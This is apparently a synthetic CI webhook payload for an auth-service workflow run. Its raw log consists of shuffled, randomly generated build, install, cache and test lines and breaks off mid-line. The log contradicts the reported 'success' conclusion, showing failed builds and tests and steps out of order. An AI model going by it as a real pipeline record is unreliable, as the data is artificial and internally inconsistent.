{
  "action": "completed",
  "workflow_run": {
    "id": 229,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "c349237f6945b7e94f0e318256429d42cc3ce9e9",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-08T12:00:22.169182Z",
    "updated_at": "2025-12-08T12:03:15.747360Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nStep 10/10: Building\nCompiling src/main.py...\nStep 10/10: Building\nCompiling src/app.ts...\nCache hit for key-5592\n  PASS: test_api_health (205ms)\nCache hit for key-3688\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/utils.go...\n[12:00:22] INFO: Processing request\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nCache hit for key-8897\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-6838\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/index.js...\nInstalling lodash@5.14.0\n  PASS: test_auth_login (233ms)\n\u2713 build completed\n  PASS: test_cache_hit (39ms)\nWARNING: eslint has known vulnerabilities\n[12:00:22] INFO: Processing request\nCache hit for key-7913\nStep 2/10: Building\n  PASS: test_db_connect (214ms)\nInstalling express@2.2.0\nStep 3/10: Building\nInstalling webpack@2.3.0\n  PASS: test_db_connect (479ms)\nStep 2/10: Building\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 4/10: Building\n[12:00:22] INFO: Processing request\nStep 6/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (41MB)\nStep 1/10: Building\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nStep 5/10: Building\n\u2713 test completed\nCache hit for key-3557\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_db_connect (157ms)\nArtifact uploaded: build.tar.gz (30MB)\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/app.ts...\n  PASS: test_cache_hit (268ms)\n  PASS: test_user_create (328ms)\nInstalling eslint@3.19.0\n  PASS: test_cache_hit (7ms)\nInstalling lodash@3.3.0\nStep 5/10: Building\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nWARNING: webpack has known vulnerabilities\nInstalling axios@5.4.0\nStep 4/10: Building\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_user_create (27ms)\nException: NullPointerException\nCompiling src/utils.go...\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-6264\n  PASS: test_auth_login (232ms)\nStep 7/10: Building\nInstalling eslint@3.15.0\n  PASS: test_db_connect (34ms)\n  PASS: test_auth_login (268ms)\nStep 3/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (3MB)\n=== Step install_dependencies completed ===\n=== Step: save_cache ===\nCompiling src/main.py...\n  PASS: test_db_connect (25ms)\nCompiling src/main.py...\nCompiling src/app.ts...\nCompiling src/app.ts...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:22] INFO: Processing request\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-4339\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:22] INFO: Processing request\nWARNING: jest has known vulnerabilities\nCache hit for key-3539\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nInstalling webpack@2.12.0\nArtifact uploaded: build.tar.gz (30MB)\nInstalling lodash@3.13.0\n  PASS: test_auth_login (159ms)\n\u2713 build completed\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-9083\nCache hit for key-4056\nCache hit for key-5140\nCache hit for key-9013\nCompiling src/main.py...\n\u2713 build completed\nCache hit for key-5556\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/utils.go...\n  PASS: test_db_connect (227ms)\nInstalling prettier@3.14.0\nStep 9/10: Building\n\u2713 build completed\nCache hit for key-6228\nCompiling src/main.py...\nWARNING: webpack has known vulnerabilities\nStep 3/10: Building\n\u2713 lint completed\nStep 10/10: Building\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\nInstalling express@5.15.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nCompiling src/main.py...\n  PASS: test_auth_login (100ms)\nInstalling axios@1.18.0\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n  PASS: test_db_connect (95ms)\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (49MB)\nInstalling axios@3.14.0\n  PASS: test_api_health (263ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_api_health\n  PASS: test_api_health (483ms)\nCache hit for key-8982\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nInstalling express@3.12.0\nInstalling eslint@1.14.0\nInstalling express@4.16.0\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-1611\nInstalling prettier@3.20.0\n[12:00:22] INFO: Processing request\nStep 5/10: Building\n\u2717 build failed with exit code 36\nCompiling src/utils.go...\nCompiling src/index.js...\n\u2717 build failed with exit code 110\nCache hit for key-9656\nCompiling src/handler.rs...\nInstalling webpack@1.16.0\n  PASS: test_user_create (194ms)\nCompiling src/utils.go...\n=== Step save_cache completed ===\n=== Step: build ===\nArtifact uploaded: build.tar.gz (16MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-8467\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (44MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_cache_hit (283ms)\n[12:00:22] INFO: Processing request\nStep 9/10: Building\nCache hit for key-1633\n  PASS: test_db_connect (122ms)\nCache hit for key-7327\n\u2713 build completed\nStep 7/10: Building\n\u2713 build completed\n  PASS: test_auth_login (37ms)\nCache hit for key-4528\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/app.ts...\n  PASS: test_db_connect (330ms)\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:22] ERROR: Connection failed\nCache hit for key-5425\n[12:00:22] INFO: Processing request\nCache hit for key-8433\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_auth_login (466ms)\n\u2713 test completed\n\u2713 build completed\nInstalling eslint@4.14.0\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nStep 6/10: Building\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCache hit for key-2332\n[12:00:22] INFO: Processing request\nCompiling src/handler.rs...\nInstalling jest@1.13.0\nCache hit for key-7341\nInstalling axios@4.3.0\nCompiling src/app.ts...\nCompiling src/service.java...\n  PASS: test_user_create (110ms)\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (3MB)\n\u2717 build failed with exit code 29\nCache hit for key-7505\nCache hit for key-6619\nCache hit for key-8007\nCache hit for key-5376\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nCompiling src/app.ts...\nInstalling react@5.17.0\n\u2713 build completed\nInstalling jest@3.6.0\n  PASS: test_user_create (376ms)\n  PASS: test_auth_login (183ms)\nCompiling src/index.js...\nInstalling prettier@4.10.0\nStep 1/10: Building\nCompiling src/index.js...\nCompiling src/handler.rs...\n[12:00:22] WARN: Deprecated API usage\nInstalling react@2.6.0\n[12:00:22] WARN: Deprecated API usage\nInstalling eslint@5.15.0\nStep 1/10: Building\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (7MB)\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (5MB)\nInstalling eslint@2.14.0\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 test completed\nStep 1/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-8790\n=== Step build completed ===\n=== Step: restore_cache ===\nException: RuntimeError\nInstalling express@5.9.0\nCompiling src/utils.go...\n  PASS: test_auth_login (29ms)\n\u2717 build failed with exit code 114\nInstalling axios@2.14.0\nStep 10/10: Building\n  PASS: test_auth_login (371ms)\nInstalling lodash@2.11.0\nCompiling src/index.js...\nCompiling src/main.py...\nInstalling webpack@4.20.0\n[12:00:22] INFO: Processing request\nInstalling jest@2.12.0\n\u2713 build completed\nInstalling lodash@5.15.0\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:22] INFO: Processing request\nInstalling axios@3.9.0\n  PASS: test_db_connect (337ms)\nInstalling eslint@5.19.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (33MB)\nInstalling lodash@5.2.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\nInstalling express@1.4.0\n  PASS: test_cache_hit (350ms)\n  PASS: test_db_connect (213ms)\nCompiling src/service.java...\nCache hit for key-1813\n[12:00:22] INFO: Processing request\nException: RuntimeError\nCache hit for key-7454\nInstalling prettier@5.10.0\nInstalling jest@2.13.0\n  PASS: test_user_create (482ms)\n  PASS: test_api_health (485ms)\n\u2713 build completed\n  PASS: test_cache_hit (202ms)\n[12:00:22] INFO: Processing request\nCache hit for key-8840\nCompiling src/index.js...\nInstalling prettier@4.5.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (242ms)\nInstalling axios@4.3.0\nCompiling src/utils.go...\nCompiling src/main.py...\nCache hit for key-8613\nWARNING: express has known vulnerabilities\nCache hit for key-2678\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nCompiling src/index.js...\n[12:00:22] ERROR: Connection failed\nInstalling axios@3.17.0\n  PASS: test_cache_hit (148ms)\n  PASS: test_cache_hit (484ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/index.js...\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (45MB)\nInstalling express@3.15.0\nCache hit for key-9757\nFAILED: test_db_connect\nCompiling src/handler.rs...\nCache hit for key-1967\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_db_connect (400ms)\nInstalling prettier@3.12.0\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/index.js...\nCompiling src/utils.go...\nInstalling eslint@1.7.0\nWARNING: lodash has known vulnerabilities\nWARNING: axios has known vulnerabilities\nCompiling src/service.java...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/handler.rs...\nInstalling jest@5.18.0\nCache hit for key-2838\n[12:00:22] INFO: Processing request\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\n[12:00:22] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (395ms)\nCache hit for key-1482\nInstalling jest@1.11.0\n  PASS: test_cache_hit (458ms)\nInstalling express@4.2.0\nArtifact uploaded: build.tar.gz (48MB)\nStep 7/10: Building\nInstalling prettier@2.6.0\nCache hit for key-4422\nCache hit for key-1458\nWARNING: webpack has known vulnerabilities\nInstalling express@2.14.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-6316\n\u2713 test completed\nInstalling jest@1.18.0\nArtifact uploaded: build.tar.gz (43MB)\nInstalling express@4.1.0\n\u2713 build completed\n\u2713 build completed\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nStep 4/10: Building\nCache hit for key-6412\nArtifact uploaded: build.tar.gz (6MB)\nException: NullPointerException\nInstalling prettier@1.3.0\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\n[12:00:22] INFO: Processing request\nStep 2/10: Building\nException: RuntimeError\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nCache hit for key-9634\n  PASS: test_user_create (22ms)\nCache hit for key-3384\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/handler.rs...\nInstalling eslint@5.4.0\n  PASS: test_user_create (321ms)\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/main.py...\n  PASS: test_user_create (208ms)\nCache hit for key-7437\nInstalling jest@4.6.0\nInstalling webpack@2.2.0\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_db_connect (56ms)\nCache hit for key-3605\n  PASS: test_auth_login (211ms)\nStep 6/10: Building\nInstalling webpack@2.16.0\nCompiling src/service.java...\nInstalling express@2.10.0\n  PASS: test_cache_hit (7ms)\n  PASS: test_user_create (435ms)\nStep 8/10: Building\n  PASS: test_user_create (7ms)\nCompiling src/service.java...\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 42\nInstalling prettier@1.9.0\n  PASS: test_db_connect (398ms)\nCache hit for key-3355\nCache hit for key-1189\nArtifact uploaded: build.tar.gz (49MB)\nInstalling lodash@1.7.0\n[12:00:22] INFO: Processing request\nCompiling src/handler.rs...\nInstalling jest@3.6.0\nInstalling prettier@2.4.0\nStep 1/10: Building\nCache hit for key-2199\nInstalling axios@1.5.0\n  PASS: test_db_connect (49ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_cache_hit (470ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-9237\nCache hit for key-2595\n=== Step setup_environment completed ===\n=== Step: checkout ===\nStep 1/10: Building\nInstalling webpack@2.18.0\nCompiling src/index.js...\nInstalling axios@1.14.0\n  PASS: test_api_health (44ms)\n  PASS: test_auth_login (7ms)\n\u2713 build completed\n[12:00:22] ERROR: Connection failed\n  PASS: test_user_create (11ms)\nCache hit for key-4113\n\u2713 test completed\n[12:00:22] INFO: Processing request\nFAILED: test_user_create\n\u2713 build completed\n[12:00:22] INFO: Processing request\nCache hit for key-8201\n[12:00:22] INFO: Processing request\nCache hit for key-6599\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4891\nStep 4/10: Building\nException: TypeError\n  PASS: test_auth_login (18ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/handler.rs...\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (16ms)\nCompiling src/index.js...\n\u2713 build completed\nCompiling src/index.js...\n[12:00:22] ERROR: Connection failed\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_db_connect (360ms)\nArtifact uploaded: build.tar.gz (18MB)\nStep 4/10: Building\nCache hit for key-4691\nCompiling src/service.java...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nCompiling src/app.ts...\nCache hit for key-8144\nStep 1/10: Building\nCache hit for key-3820\nCache hit for key-8317\nCache hit for key-7965\nStep 9/10: Building\n  PASS: test_auth_login (176ms)\n[12:00:22] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-8097\nWARNING: jest has known vulnerabilities\nStep 9/10: Building\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:22] INFO: Processing request\nStep 8/10: Building\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nStep 6/10: Building\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n\u2717 build failed with exit code 53\nArtifact uploaded: build.tar.gz (2MB)\nInstalling prettier@3.15.0\n[12:00:22] INFO: Processing request\nInstalling lodash@2.19.0\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (228ms)\nInstalling axios@5.3.0\nInstalling eslint@1.18.0\nStep 2/10: Building\n  PASS: test_cache_hit (391ms)\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\n=== Step checkout completed ===\n=== Step: type_check ===\nArtifact uploaded: build.tar.gz (1MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (33MB)\nInstalling express@3.20.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\nStep 2/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\nCompiling src/main.py...\n[12:00:22] WARN: Deprecated API usage\nStep 2/10: Building\nStep 3/10: Building\n[12:00:22] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_db_connect (229ms)\nCache hit for key-1279\n\u2713 test completed\n  PASS: test_auth_login (40ms)\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (230ms)\n[12:00:22] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_user_create (313ms)\n\u2713 build completed\nCache hit for key-2112\nCache hit for key-5174\nCompiling src/index.js...\nCompiling src/utils.go...\nInstalling eslint@3.12.0\n[12:00:22] INFO: Processing request\n\u2713 build completed\nStep 6/10: Building\nCompiling src/index.js...\nInstalling lodash@3.9.0\nStep 10/10: Building\nCompiling src/index.js...\nInstalling jest@2.8.0\n[12:00:22] INFO: Processing request\nInstalling lodash@5.6.0\n[12:00:22] WARN: Deprecated API usage\nInstalling webpack@3.4.0\n\u2713 build completed\n  PASS: test_db_connect (12ms)\n  PASS: test_cache_hit (326ms)\nArtifact uploaded: build.tar.gz (1MB)\nFAILED: test_cache_hit\n[12:00:22] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_api_health (271ms)\n  PASS: test_cache_hit (137ms)\nInstalling express@3.16.0\nFAILED: test_db_connect\n[12:00:22] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/service.java...\nException: RuntimeError\nCache hit for key-1439\nStep 1/10: Building\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_api_health (393ms)\nCache hit for key-7709\nCompiling src/utils.go...\nInstalling jest@5.18.0\n\u2713 build completed\nCache hit for key-3039\nStep 10/10: Building\nCache hit for key-9749\nStep 3/10: Building\nInstalling axios@1.10.0\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\nInstalling eslint@5.15.0\nStep 6/10: Building\nWARNING: eslint has known vulnerabilities\n[12:00:22] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\nStep 4/10: Building\n  PASS: test_api_health (268ms)\nStep 3/10: Building\nCompiling src/utils.go...\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_auth_login (296ms)\n[12:00:22] INFO: Processing request\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nCache hit for key-1064\nCache hit for key-6136\n[12:00:22] INFO: Processing request\n\u2713 test completed\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_db_connect (471ms)\nStep 5/10: Building\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (24MB)\nStep 5/10: Building\n  PASS: test_auth_login (122ms)\n[12:00:22] ERROR: Connection failed\n  PASS: test_cache_hit (457ms)\n\u2713 test completed\n  PASS: test_cache_hit (361ms)\nCompiling src/handler.rs...\nCompiling src/index.js...\nCompiling src/service.java...\nCache hit for key-4512\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (112ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n  PASS: test_user_create (211ms)\n  PASS: test_cache_hit (279ms)\nInstalling react@5.15.0\n[12:00:22] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\nInstalling lodash@5.16.0\n[12:00:22] ERROR: Connection failed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCache hit for key-1929\nCache hit for key-6023\nWARNING: jest has known vulnerabilities\nStep 4/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nInstalling eslint@2.10.0\nStep 10/10: Building\nStep 7/10: Building\nCache hit for key-8168\nCompiling src/utils.go...\nCache hit for key-9358\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-1002\nCompiling src/app.ts...\nInstalling prettier@5.15.0\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-6239\nInstalling jest@1.14.0\nCompiling src/main.py...\nStep 8/10: Building\n  PASS: test_cache_hit (470ms)\nInstalling prettier@4.20.0\nCompiling src/main.py...\n[12:00:22] WARN: Deprecated API usage\n\u2717 build failed with exit code 104\n\u2713 build completed\n\u2713 build completed\nInstalling react@4.15.0\n\u2713 test completed\n  PASS: test_db_connect (441ms)\n[12:00:22] INFO: Processing request\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nCache hit for key-3644\n[12:00:22] INFO: Processing request\nInstalling axios@3.0.0\n  PASS: test_auth_login (150ms)\nWARNING: lodash has known vulnerabilities\nCache hit for key-3897\nWARNING: lodash has known vulnerabilities\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (161ms)\n\u2713 test completed\n=== Step upload_artifacts completed ===\n=== Step: e2e_tests ===\nStep 3/10: Building\nWARNING: prettier has known vulnerabilities\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_db_connect (228ms)\nArtifact uploaded: build.tar.gz (25MB)\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (44MB)\nStep 10/10: Building\nInstalling prettier@5.18.0\nArtifact uploaded: build.tar.gz (7MB)\nStep 8/10: Building\n  PASS: test_db_connect (217ms)\nInstalling react@3.13.0\n[12:00:22] INFO: Processing request\nCache hit for key-7785\nCompiling src/index.js...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/service.java...\nStep 4/10: Building\n[12:00:22] INFO: Processing request\n\u2713 build completed\nCompiling src/service.java...\nInstalling jest@1.16.0\n  PASS: test_db_connect (399ms)\nStep 10/10: Building\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/utils.go...\nCache hit for key-6114\n[12:00:22] INFO: Processing request\nCache hit for key-1341\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\nInstalling jest@3.15.0\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling prettier@1.1.0\n  PASS: test_cache_hit (206ms)\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (49ms)\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (114ms)\n\u2713 test completed\n  PASS: test_db_connect (101ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling webpack@5.0.0\n  PASS: test_db_connect (359ms)\n[12:00:22] INFO: Processing request\nStep 5/10: Building\n\u2713 build completed\nCache hit for key-4493\n[12:00:22] INFO: Processing request\nStep 2/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (38MB)\nInstalling prettier@2.17.0\nInstalling prettier@2.2.0\nCompiling src/app.ts...\n  PASS: test_auth_login (101ms)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (336ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\nCompiling src/handler.rs...\nCache hit for key-8163\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-4285\nInstalling axios@4.1.0\n  PASS: test_db_connect (115ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_api_health (47ms)\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\n\u2713 test completed\nCache hit for key-9477\n  PASS: test_user_create (414ms)\n[12:00:22] INFO: Processing request\nStep 10/10: Building\nCache hit for key-9222\n  PASS: test_api_health (142ms)\nCache hit for key-7469\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-3991\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 test completed\n  PASS: test_auth_login (248ms)\nStep 4/10: Building\nCache hit for key-5430\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nCompiling src/service.java...\n  PASS: test_db_connect (43ms)\nInstalling jest@5.8.0\n  PASS: test_api_health (133ms)\nArtifact uploaded: build.tar.gz (26MB)\nFAILED: test_auth_login\nCache hit for key-9037\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nInstalling jest@2.9.0\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/handler.rs...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:22] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/app.ts...\n  PASS: test_user_create (135ms)\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCache hit for key-7233\n[12:00:22] INFO: Processing request\nStep 9/10: Building\n  PASS: test_auth_login (475ms)\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (469ms)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\n\u2713 build completed\n\u2713 build completed\n  PASS: test_cache_hit (445ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-8772\nCompiling src/service.java...\nInstalling react@4.1.0\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1209\nInstalling lodash@3.2.0\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-1238\nCompiling src/app.ts...\nInstalling lodash@1.2.0\nInstalling express@3.5.0\nCache hit for key-7520\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: webpack has known vulnerabilities\n  PASS: test_cache_hit (333ms)\nStep 2/10: Building\n=== Step setup_node completed ===\n=== Step: deploy_production ===\n  PASS: test_auth_login (17ms)\nCache hit for key-6250\n  PASS: test_db_connect (249ms)\n  PASS: test_auth_login (451ms)\n  PASS: test_auth_login (359ms)\n[12:00:22] INFO: Processing request\nCompiling src/index.js...\nInstalling react@3.17.0\n[12:00:22] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nInstalling eslint@2.3.0\nStep 4/10: Building\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\nInstalling lodash@5.5.0\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz 